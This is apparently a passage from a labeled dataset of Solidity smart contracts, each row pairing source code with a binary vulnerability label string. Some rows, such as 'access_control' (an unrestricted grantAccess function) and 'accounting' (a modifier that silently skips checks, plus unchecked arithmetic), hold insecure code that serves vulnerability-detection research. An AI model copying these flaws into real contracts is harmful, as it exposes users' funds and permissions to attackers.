    bytes32 internal constant ROLE_COMPANY_UPGRADE_ADMIN = 0xfef15747c403732d986b29a92a880d8f2fb886b99417c8bbef226f85885ca924;

}

",0000000000000000000000000
10101,AccessSecretStoreCondition,"pragma solidity 0.5.6;

 
 
 


import './Condition.sol';

import '../registry/DIDRegistry.sol';

import '../interfaces/ISecretStore.sol';

import '../interfaces/ISecretStorePermission.sol';

import '../agreements/AgreementStoreManager.sol';



 

contract AccessSecretStoreCondition is Condition, 

ISecretStore, ISecretStorePermission {



    struct DocumentPermission {

        bytes32 agreementIdDeprecated;

        mapping(address => bool) permission;

    }



    mapping(bytes32 => DocumentPermission) private documentPermissions;

    AgreementStoreManager private agreementStoreManager;

    

    

    event Fulfilled(

        bytes32 indexed _agreementId,

        bytes32 indexed _documentId,

        address indexed _grantee,

        bytes32 _conditionId

    );

    

    modifier onlyDIDOwnerOrProvider(

        bytes32 _documentId

    )

    {

        DIDRegistry didRegistry = DIDRegistry(

            agreementStoreManager.getDIDRegistryAddress()

        );

        

        require(

            didRegistry.isDIDProvider(_documentId, msg.sender) || 

            msg.sender == didRegistry.getDIDOwner(_documentId),

            'Invalid DID owner/provider'

        );

        _;

    }



    

    function initialize(

        address _owner,

        address _conditionStoreManagerAddress,

        address _agreementStoreManagerAddress

    )

        external

        initializer()

    {   

        Ownable.initialize(_owner);



        conditionStoreManager = ConditionStoreManager(

            _conditionStoreManagerAddress

        );



        agreementStoreManager = AgreementStoreManager(

            _agreementStoreManagerAddress

        );

    }



    

    function hashValues(

        bytes32 _documentId,

        address _grantee

    )

        public

        pure

        returns (bytes32)

    {

        return keccak256(abi.encodePacked(_documentId, _grantee));

    }



    

    function fulfill(

        bytes32 _agreementId,

        bytes32 _documentId,

        address _grantee

    )

        public

        returns (ConditionStoreLibrary.ConditionState)

    {

        grantPermission(

            _grantee,

            _documentId

        );

        

        bytes32 _id = generateId(

            _agreementId,

            hashValues(_documentId, _grantee)

        );



        ConditionStoreLibrary.ConditionState state = super.fulfill(

            _id,

            ConditionStoreLibrary.ConditionState.Fulfilled

        );

        

        emit Fulfilled(

            _agreementId,

            _documentId,

            _grantee,

            _id

        );



        return state;

    }

    

    

    function grantPermission(

        address _grantee,

        bytes32 _documentId

        

    )

        public

        onlyDIDOwnerOrProvider(_documentId)

    {

        documentPermissions[_documentId].permission[_grantee] = true;

    }



    

    function renouncePermission(

        address _grantee,

        bytes32 _documentId

    )

        public

        onlyDIDOwnerOrProvider(_documentId)

    {

        documentPermissions[_documentId].permission[_grantee] = false;

    }

    

    

    function checkPermissions(

        address _grantee,

        bytes32 _documentId

    )

        external view

        returns(bool permissionGranted)

    {

        DIDRegistry didRegistry = DIDRegistry(

            agreementStoreManager.getDIDRegistryAddress()

        );

        return (

            didRegistry.isDIDProvider(_documentId, _grantee) || 

            _grantee == didRegistry.getDIDOwner(_documentId) ||

            documentPermissions[_documentId].permission[_grantee] ||

            didRegistry.getPermission(_documentId, _grantee)

        );

    }

}



",0000000000000000000000000
10102,AccessToken,"pragma solidity 0.4.24;



import ""openzeppelin-solidity/contracts/token/ERC20/PausableToken.sol"";

import ""./interfaces/IRegistry.sol"";

import ""./interfaces/IBrickblockToken.sol"";





 


 



contract AccessToken is PausableToken {

  uint8 public constant version = 1;



   
  IRegistry internal registry;

  string public constant name = ""AccessToken"";

  string public constant symbol = ""ACT"";

  uint8 public constant decimals = 18;



   
  uint256 internal totalMintedActPerLockedBbkToken;



   
  uint256 public totalLockedBBK;



   
  mapping(address => uint256) internal lockedBbkPerUser;



   

  mapping(address => uint256) internal mintedActPerUser;



   
  mapping(address => uint256) internal mintedActFromCurrentLockPeriodPerUser;



   
  mapping(address => uint256) internal mintedActFromPastLockPeriodsPerUser;



   
  mapping(address => uint256) internal balances;



   
  mapping(address => uint256) public receivedAct;



   
  mapping(address => uint256) public spentAct;





  event Mint(uint256 amount);

  event Burn(address indexed burner, uint256 value);

  event BbkLocked(

    address indexed locker,

    uint256 lockedAmount,

    uint256 totalLockedAmount

  );

  event BbkUnlocked(

    address indexed locker,

    uint256 unlockedAmount,

    uint256 totalLockedAmount

  );



  modifier onlyContract(string _contractName) {

    require(

      msg.sender == registry.getContractAddress(_contractName)

    );

    _;

  }



  constructor(address _registryAddress)

    public

  {

    require(_registryAddress != address(0));

    registry = IRegistry(_registryAddress);

  }



   
   
  function lockedBbkOf(address _address)

    external

    view

    returns (uint256)

  {

    return lockedBbkPerUser[_address];

  }



   

  function lockBBK(uint256 _amount)

    external

    returns (bool)

  {

    require(_amount > 0);

    IBrickblockToken _bbk = IBrickblockToken(

      registry.getContractAddress(""BrickblockToken"")

    );



    require(settleCurrentLockPeriod(msg.sender));

    lockedBbkPerUser[msg.sender] = lockedBbkPerUser[msg.sender].add(_amount);

    totalLockedBBK = totalLockedBBK.add(_amount);

    require(_bbk.transferFrom(msg.sender, this, _amount));

    emit BbkLocked(msg.sender, _amount, totalLockedBBK);



    return true;

  }



   

  function unlockBBK(uint256 _amount)

    external

    returns (bool)

  {

    require(_amount > 0);

    IBrickblockToken _bbk = IBrickblockToken(

      registry.getContractAddress(""BrickblockToken"")

    );

    require(_amount <= lockedBbkPerUser[msg.sender]);

    require(settleCurrentLockPeriod(msg.sender));

    lockedBbkPerUser[msg.sender] = lockedBbkPerUser[msg.sender].sub(_amount);

    totalLockedBBK = totalLockedBBK.sub(_amount);

    require(_bbk.transfer(msg.sender, _amount));

    emit BbkUnlocked(msg.sender, _amount, totalLockedBBK);



    return true;

  }



   

  function distribute(uint256 _amount)

    external

    onlyContract(""FeeManager"")

    returns (bool)

  {

    totalMintedActPerLockedBbkToken = totalMintedActPerLockedBbkToken

      .add(

        _amount

          .mul(1e18)

          .div(totalLockedBBK)

      );



    uint256 _delta = (_amount.mul(1e18) % totalLockedBBK).div(1e18);

    mintedActFromPastLockPeriodsPerUser[owner] = mintedActFromPastLockPeriodsPerUser[owner].add(_delta);

    totalSupply_ = totalSupply_.add(_amount);

    emit Mint(_amount);



    return true;

  }



   

  function getMintedActFromCurrentLockPeriod(address _address)

    private

    view

    returns (uint256)

  {

    return lockedBbkPerUser[_address]

      .mul(totalMintedActPerLockedBbkToken.sub(mintedActPerUser[_address]))

      .div(1e18);

  }



   

  function settleCurrentLockPeriod(address _address)

    private

    returns (bool)

  {

    mintedActFromCurrentLockPeriodPerUser[_address] = getMintedActFromCurrentLockPeriod(_address);

    mintedActFromPastLockPeriodsPerUser[_address] = mintedActFromPastLockPeriodsPerUser[_address]

      .add(mintedActFromCurrentLockPeriodPerUser[_address]);

    mintedActPerUser[_address] = totalMintedActPerLockedBbkToken;



    return true;

  }



   



   

  function balanceOf(address _address)

    public

    view

    returns (uint256)

  {

    mintedActFromCurrentLockPeriodPerUser[_address] = getMintedActFromCurrentLockPeriod(_address);



    return totalMintedActPerLockedBbkToken == 0

      ? 0

      : mintedActFromCurrentLockPeriodPerUser[_address]

      .add(mintedActFromPastLockPeriodsPerUser[_address])

      .add(receivedAct[_address])

      .sub(spentAct[_address]);

  }



   

  function transfer(

    address _to,

    uint256 _value

  )

    public

    whenNotPaused

    returns (bool)

  {

    require(_to != address(0));

    require(_value <= balanceOf(msg.sender));

    spentAct[msg.sender] = spentAct[msg.sender].add(_value);

    receivedAct[_to] = receivedAct[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);



    return true;

  }



   

  function transferFrom(

    address _from,

    address _to,

    uint256 _value

  )

    public

    whenNotPaused

    returns (bool)

  {

    require(_to != address(0));

    require(_value <= balanceOf(_from));

    require(_value <= allowed[_from][msg.sender]);

    spentAct[_from] = spentAct[_from].add(_value);

    receivedAct[_to] = receivedAct[_to].add(_value);

    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

    emit Transfer(_from, _to, _value);



    return true;

  }



   



   

  function burn(

    address _address,

    uint256 _value

  )

    external

    onlyContract(""FeeManager"")

    returns (bool)

  {

    require(_value <= balanceOf(_address));

    spentAct[_address] = spentAct[_address].add(_value);

    totalSupply_ = totalSupply_.sub(_value);

    emit Burn(_address, _value);



    return true;

  }

}

",0000000000000000000000000
10103,AccessTokenUpgradeExample,"pragma solidity 0.4.24;



 



import ""../AccessToken.sol"";





contract AccessTokenUpgradeExample is AccessToken {



  constructor(address _registry)

    public

    AccessToken(_registry)

  {}



  function balanceOf(address _address)

    public

    view

    returns (uint256)

  {

    return totalMintedActPerLockedBbkToken == 0

      ? 0

      : AccessToken(

        registry.getContractAddress(""AccessTokenOld"")

      ).balanceOf(_address)

      .add(lockedBbkPerUser[_address])

      .mul(totalMintedActPerLockedBbkToken.sub(mintedActPerUser[_address]))

      .div(1e18)

      .add(mintedActFromPastLockPeriodsPerUser[_address])

      .add(receivedAct[_address])

      .sub(spentAct[_address]);

  }

}

",0000000000000000000000000
10104,access_control,"contract AccessManager {



    mapping(address => bool) public registry;



    function grantAccess(address assetAddr) {

        registry[assetAddr] = true;

    }



    function isAuthorized(address assetAddr) constant returns (bool) {

        return registry[assetAddr];

    }

}",0000000000000000000010000
10105,AccountEvents,"

pragma solidity 0.5.16;



 



contract AccountEvents {



     



    event AuthKeyAdded(address indexed authKey);

    event AuthKeyRemoved(address indexed authKey);

    event CallFailed(string reason);



     



    event Upgraded(address indexed implementation);

}",0000000000000000000000000
10106,accounting,"pragma solidity^0.4.25;



 
 


contract FinancialReport {

    

    uint totalrevenue;

    uint profit;

    uint totalcost;

    uint salaries;

    uint expenses;

    uint assets;

    uint wealth;

    uint datecomputed;

    

    struct Asset {

        string name;

        uint value;

        bool currentlyowned;

        uint soldfor;

        string soldto;

    }

    

    Asset[] public assetlist;

    

    mapping(string => uint) assetnames;

    mapping(address => bool) board;

    

    uint ID;

    string startdate;

    uint today;

    address chairperson;

    uint conversion;

    

    constructor(string _startdate) public {

        startdate = _startdate;

        today = block.timestamp;

        chairperson = msg.sender;

        conversion = 1 ether;

    }

    

    modifier onlyboard() {

        if (msg.sender == chairperson || 

        board[msg.sender] == true) {

            _;

        }

    }

    

    function assignBoardMember(address _board) public {

        require (msg.sender == chairperson);

        board[_board] = true;

    }

    

    function depositRevenue() public payable {

        totalrevenue += msg.value;

    }

    

    function executePayment(address _to, uint _value) public onlyboard {

        uint value;

        value = _value*1 ether;

        _to.transfer(value);

        expenses += value;

    }

    

    function paySalary(address _to, uint _value) public onlyboard {

        uint value;

        value = _value*conversion;

        _to.transfer(value);

        salaries += value;

    }

    

    function addAsset(string _name, uint _value) public onlyboard{

        for (uint i = 0; i < assetlist.length; i++) {

            require (stringsEqual(assetlist[i].name, _name) == false); 

        }

        uint value;

        value = _value*conversion;

        assetlist.push(Asset(_name, value, true, 0, ""Not sold yet""));

        assets += value;

        assetnames[_name] = ID;

        ID++;

    }

    

    function reportSoldAsset(string _assetname, uint _value, string _soldto) 

        public 

        onlyboard {

            uint n;

            n = assetnames[_assetname];

            uint value;

            value = _value*conversion;

            assetlist[n].currentlyowned = false;

            assetlist[n].soldfor = value;

            assetlist[n].soldto = _soldto;

            assets -= assetlist[n].value; 

            totalrevenue += value;

    }

    

    function computeReport() public {

        totalcost = expenses + salaries;

        profit = totalrevenue - totalcost;

        wealth = profit + assets;

        datecomputed = (block.timestamp - today)/60/60;

    }

    

    function getReport() public view returns (

    string,

    uint,

    uint,

    uint, 

    uint,

    uint,

    uint,

    uint, 

    uint) {

        return (

            startdate,

            datecomputed,

            wealth/conversion,

            profit/conversion,

            totalrevenue/conversion,

            totalcost/conversion,

            expenses/conversion,

            salaries/conversion,

            assets/conversion);

    }

        



    function stringsEqual(string storage _a, string memory _b) 

        internal 

        pure 

        returns(bool) {

            bytes storage a = bytes(_a);

            bytes memory b = bytes(_b);

                if (keccak256(a) != keccak256(b)) {

                    return false;

                }

        return true;

    }

}

",0100000000000000000001000
10107,AccountIngress,"pragma solidity 0.5.9;



import ""./AccountRulesProxy.sol"";

import ""./Ingress.sol"";





contract AccountIngress is Ingress {

     
    uint private version = 1000000;



    function getContractVersion() public view returns(uint) {

        return version;

    }



    function transactionAllowed(

        address sender,

        address target,

        uint256 value,

        uint256 gasPrice,

        uint256 gasLimit,

        bytes memory payload

    ) public view returns (bool) {

        if(getContractAddress(RULES_CONTRACT) == address(0)) {

            return true;

        }



        return AccountRulesProxy(registry[RULES_CONTRACT]).transactionAllowed(

            sender, target, value, gasPrice, gasLimit, payload

        );

    }

}

",0000000000000000000000000
10108,AccountInitialize,"pragma solidity 0.5.16;



import ""./AccountInitializeV1.sol"";



 



contract AccountInitialize is AccountInitializeV1 {}",0000000000000000000000000

